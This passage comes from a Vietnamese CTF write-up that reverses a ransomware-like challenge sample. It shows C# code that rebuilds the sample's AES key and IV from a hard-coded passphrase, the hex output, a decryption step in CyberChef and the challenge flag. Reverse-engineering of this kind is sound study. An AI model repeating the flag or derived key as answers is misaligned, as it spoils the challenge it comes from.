                108, 32, 110, 111, 119, 32, 99, 104, 101, 99,
                107, 32, 116, 104, 101, 32, 100, 114
            };

            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(GET_CIPHER_KEY, array2, 4096);
            int KeySize = 256;
            int BlockSize = 128;
            byte[] Key = rfc2898DeriveBytes.GetBytes(KeySize / 8);
            byte[] IV = rfc2898DeriveBytes.GetBytes(BlockSize / 8);
            Console.WriteLine(ByteArrayToString(Key));
            Console.WriteLine(ByteArrayToString(IV));
        }

        static void Main(string[] args)
        {
            string GET_CIPHER_KEY = "HF48K!SP%hHudfQrk?*wvYvn*F-$DrooyKUdie0ZcY82OR%bW6$Mbk15hR?E@bLZ/q(TL!IGTmTXm/ZtKtqU0bNNfl(RgwjAMj9uWyQjy7)*QeTo/b)T8+wnc4*x+$wuCTKDF1XjcHs/iY&ASeYF2PPV9WSo9qr7KV9?UPjOEg+0V3ED7!fkpr+!E@Q6i5w8m84Nm=3C(KBVYl=GRO3=LHSqd-)e-z2V7FNj-+o8Hcpfqtlp$KpUCxxfqO6nFYDSe3lTXmHZx%/6p9A7kbo!KiSJe5)6HA25YWA!HSRaCPtH5+@3O=D16PH(kb*ptXSxPJhS8NzSJN8(@Lbn)MsI?B-IOFZ2dz41&&/vgt%AW7rseMGZAXvg2K0NKZD3!&*hgG-/S2HWRs8Mgd0C-A2FDY=9T1lHpONZ&KMYONGUQYPKYn34vB4!R6dHHLwoR=3DeiQWQc*7)i*1J@l2?3jogZIN3EQCopCRsM2$XhoSN&)5%y-Rx%qlnPtFZCpLL8TbguJ?KvenPQbjgZSFF=cu=n1cpxnU+cGb0oZXoBHBmCWW*Kv=7kFMgwc/)4ekIJw9K=6+A(nE/aH&ReofBnkdX%(DMhd7uu)dcjM*a3=*?BUFpfxlQ=isvSmQE22po2hVg1q5SzEUnvgVw$l37/ruLY4K?&7vBhXRr=v**+Tn%OEA9QqOR-4wL9JI&g8V+gSFYP1xRx//vDz?T3Y3dtdDzxF5@n+fG?wl(-ztl/&rG@AIJM*PIE/UCPdxJ&715k9xeOCVE1Rkx9?!x?v0zyWCEbj2sBkpHS8tCZ0(JqKe9fuPSq=MXHCGN7tD2W0CQzceBb7XU0qJn/Pw3TjBBYRAQ1fS3xQ!@INKCPO+5z/un)qVs&Wi!yA/hcOW(pqtk3Tf1FtnFsSZgujXLKx7a4AOHVzxB+&QJVJ7wKqmZ6dSfyj!/+L8+6T23EYgc&mNvCQLkzxArKhqb46g8@4J2LZZBdDs9JKdUPtdiYZQRKR4Z0b-V/unOchk0$JGvEOh=DWLLc?kmn/s%rAYCFW%luO/4I0rOSsM&64VdP9/%KAyj@qI$8Ep4T(c*deDzdWT(2vK!2%9SdAbtnf/or1dODez!bgA86Qn!324QgUK$SWbTr5Y-mlHy)F/X&WiV%AjNjo$7yyIWqm(3DfTsICWUI*%x!gUJ9@&R!N7C/nW!d8IeKLUnC@N+1PFuuP&Se-k1p1)$vQ0s2i$X3mnzL3H&yEmuHMfzqEgeXd@gSd/8MsMTY5+HzUGx+oCkOV6i8BByBj=ZxGg5*V7G/TWYVY=V?5n5bcS?ugALqlR@5ogs*Y9t4(r%-hNjB30S&R-V*iKfUvneChp3+ehw&)Bf7X-NSnK98-)oqL3cNeYIfN/o+hstWDWCPqlok?M3l0tDoBN3xEips/=tfhV8(nn4z$Y=xP/QRrt1r*=$T*&Rr4gXq+ICza7-N*bxzNFhMSXBWVBqhfoGrVM(hBg5H@o+6un3kZOG6lEYhfAU@psT91e+ygPx3WaX1gRy4VFHQiXFR*kBAL/oTUEFQwEEJnZjL4tANZnrjkCbdZx!(Nwse8DhbMiIRA-0I*%jRj*yvYF6R0y+-QJ($4FZ0LwB+fZimZSpeNtiZ-&F3UQxkrJA+C9a5r5F!97Q-tT+hJj8uys/7=tg(=oXVZrkm/6!eounO3GKAZPaHYdPg%p5?ZK!Vk%wB6bpZvdFDF1D)jft7NP?(cEsZA@Fe7R19hIR?xBj%XMaQl@l)oDHU&0w26PY5XyT!=RjaNvKM2DuQ0c!LbL@3Jg$3jmOhz0tv)mQUdL3/)(p)GgBdbNeM8m0qa2$yhzkCg-WNMq4Pf?!O+?xDk7FlVh!d8w)xUEiQimjHJ!R8fO3*zmzdF!Nxu-3-L)bmwH(amt2bkq%wpTGG0-1W?nsh+7tk5k(Pj2MYTcYF6X)m/nHa/xUNOFoImlj1ASs=u1N9G5!XwwmxuFob0SsIP4BdOD94)uFo1)+NZUTJ!?npq+lg&IB4xk6$07vD(FeCr-(1NaBf-iVSRi!Wpc78tX+RJBkpwQ";
            byte[] array2 = Encoding.UTF8.GetBytes(GET_CIPHER_KEY);
            array2 = SHA256.Create().ComputeHash(array2);
            CIPHER(array2);
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
    }
}
```

output:

```
3c018cf3c80f10d8d65f78883924f7334bd676c8a8218b9058098042c872fc25
5712977081703cb3b72e6a7f99121847
```

Ta đã biết rằng tập tin này mã hoá các file trong cùng thư mục và thêm phần mở rộng là ``.config``. Và tập tin có phần mở rộng như này trong thư mục chỉ có ``VGAuth.sys.config``

Mình load nó lên ``CyberChef`` và decrypt.

![](https://hackmd.io/_uploads/BJdYqgFn3.png)

![](https://hackmd.io/_uploads/r1Dj9gFh3.png)

Flag: `ctfzone{!R1nG0_r00Tk1T_Ea$Y_byPa$$!}`





